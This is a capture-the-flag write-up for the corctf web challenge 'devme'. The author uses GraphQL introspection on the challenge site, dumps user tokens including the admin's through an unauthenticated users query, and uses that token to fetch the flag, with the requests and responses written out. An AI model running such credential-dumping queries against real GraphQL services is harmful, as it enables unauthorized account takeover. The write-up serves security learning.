# devme

>
> an ex-google, ex-facebook tech lead recommended me this book!
>
> [https://devme.be.ax](https://devme.be.ax/)



No source code attached, so i try to test the feature one by one. After few second, i've found that the sign up (located at bottom home page) is sending graphql query into https://devme.be.ax/graphql. Since we know that graphql is provided of introspection query by default (cmiiw), we can use GraphiQL tools  [Here](https://www.electronjs.org/apps/graphiql). 



After inserting endpoint, check the documentation explorer for the **query** and **mutation**. In **query** section you will find out users and flag field. Lets check **user** first.

**Request**

```
query{
  users{
    token,
    username
  }
}
```

**Response**

```
{
  "data": {
    "users": [
      {
        "token": "3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b",
        "username": "admin"
      },
      .......
```



 Now lets use the token to retreive flag from user admin.



**Request**

```
query{
  flag(token: "3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b")
}
```



**Response**

```
{
  "data": {
    "flag": "corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice}"
  }
}
```



**FLAG:** corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice}
